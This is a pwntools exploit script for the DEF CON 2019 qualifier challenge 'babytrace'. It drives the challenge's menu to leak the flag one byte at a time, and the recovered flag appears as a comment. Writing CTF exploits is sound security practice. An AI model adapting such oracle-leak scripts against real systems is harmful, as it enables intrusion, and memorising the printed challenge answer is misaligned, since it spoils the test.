#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch='i386')
exe = './path/to/binary'

host = args.HOST or 'babytrace.quals2019.oooverflow.io'
port = int(args.PORT or 5000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

#OOO{memory_objects_get_you_every_time}
flag = ''
for i in range(0xff):
    io = start()

    def ch(s):
        io.recvuntil('Choice:')
        io.sendline(str(s))
    def st(x):
        ch(1)
        io.sendlineafter('steps: ', str(x))

    ch(2)
    ch(1)
    ch(3)
    io.recv()
    s='{}000000'.format(hex(i).replace('0x', '').zfill(2))
    print (s)
    io.sendline(s)
    ch(0)
    st(11)
    ch(6)
    io.recv()
    io.sendline('eax')
    ch(7)
    io.recvuntil('Bool')
    data = io.recvuntil('==').replace('==', '').strip()
    flag += chr(int(data,16))
    print (flag)

    io.close()

